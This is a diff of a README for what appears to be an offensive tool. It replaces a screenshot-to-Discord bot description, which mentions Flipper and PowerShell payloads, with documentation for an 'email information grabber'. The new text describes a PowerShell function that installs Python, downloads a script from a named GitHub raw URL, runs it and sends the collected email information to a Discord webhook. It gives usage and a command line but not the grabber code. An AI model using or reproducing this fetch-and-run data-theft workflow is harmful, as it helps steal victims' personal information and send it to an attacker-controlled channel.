@@ -1,49 +1,31 @@
-# Screenshot Bot - Discord Webhook Automation
+# Python Email Information Grabber
 
-## Overview
+This PowerShell script is designed to automate the process of downloading Python and its dependencies to run a Python script that collects email information. The Python script is specifically intended to be used with a Discord webhook for sending the collected data.
 
-Screenshot Bot is a Python script designed to capture and share screenshots of specified websites to a Discord channel using a webhook. It utilizes various Python libraries like `webbrowser`, `time`, `pyautogui`, `os`, and `requests` to automate the process of opening web pages, capturing screenshots, and sending them to a Discord webhook.
-This script is used by flipper and powershell payloads.
 ## Prerequisites
+Before using this script, ensure you have the following:
 
-- Python 3.x installed on your system.
-- Python libraries: `webbrowser`, `time`, `pyautogui`, `os`, `requests`.
-- A Discord account and access to a Discord server with the appropriate permissions to create and use a webhook URL.
-
-## Setup
-
-1. Install Python 3.x: Make sure you have Python 3.x installed on your system. You can download it from the official Python website.
-
-2. Install required libraries: Open a terminal or command prompt, navigate to the directory containing the script, and run the following command to install the necessary libraries:
-
-   ```bash
-   pip install requests
-   ```
-
-3. Obtain Discord Webhook URL: Create a new webhook on your Discord server by following these steps:
-   - Go to your Discord server settings.
-   - Click on the "Integrations" tab.
-   - Select "Webhooks" and click "Create Webhook."
-   - Customize the webhook settings (name, avatar, etc.) and copy the webhook URL.
-
-4. Update the script: Replace `'YOUR DISCORD WEBHOOK'` in the script with the actual Discord webhook URL you obtained in the previous step.
+- Windows operating system
+- An active internet connection
 
 ## How to Use
+1. Open a PowerShell terminal.
+2. Save the script to a local file with a `.ps1` extension.
+3. Run the script by calling the `Grab-Emails` function. Optionally, you can provide a Discord webhook URL as a parameter to the function if you want to customize it. If no webhook URL is provided, the script will use a default webhook URL.
 
-1. Define the list of URLs: Modify the `urls` list in the script with the URLs you want to capture screenshots of.
+```powershell
+Grab-Emails -wbhk "YOUR DISCORD WEBHOOK HERE"
+```
 
-2. Run the script: Save the script and run it using the following command:
+## Functionality
+The script provides the following functionality:
 
-   ```bash
-   python screenshot_bot.py
-   ```
+1. **InstallPython**: Downloads and installs Python version 3.9.6 for Windows. If Python is already installed, it will skip this step.
+2. **InstallPipPackages**: Installs the required Python packages - `requests` and `pyautogui` - using `pip3`.
+3. **RunPythonScript**: Downloads the Python script from a GitHub repository and runs it using the installed Python.
 
-3. Execution: The script will open each URL in a browser tab, capture a screenshot of the page, save it temporarily, and then send all the screenshots as attachments to the specified Discord webhook.
-
-4. Discord Channel: The screenshots will be posted in the Discord channel connected to the webhook. The bot will post the screenshots with a message that says "Screenshots for URLs:".
-
-## Important Notes
-
-- The script captures the first URL separately and then captures the remaining URLs concurrently using a ThreadPoolExecutor for faster processing.
-- The script uses `pyautogui` to control the browser and capture screenshots. Make sure the browser window is visible and accessible during script execution.
-- Use this script responsibly and ensure you have permission to capture screenshots of the websites you are targeting.
+## Notes
+- If Python is already installed on your system, the script will not reinstall it and will proceed with the existing installation.
+- If `pip` is not installed, the script will install it to ensure that the required packages are installed properly.
+- The script uses a default Python script located in the GitHub repository: [Adv Email Info Grab & Upload/emailgrabber.py](https://raw.githubusercontent.com/calinux-py/Python/main/Adv%20Email%20Info%20Grab%20%26%20Upload/emailgrabber.py). If you want to use a different Python script, you can replace the URL in the `RunPythonScript` function.
+- The script replaces the Discord webhook URL placeholder (`YOUR DISCORD WEBHOOK HERE`) in the Python script with the provided webhook URL, allowing you to customize the Discord channel to which the email information is sent. If no webhook URL is provided, the script will use the default placeholder.
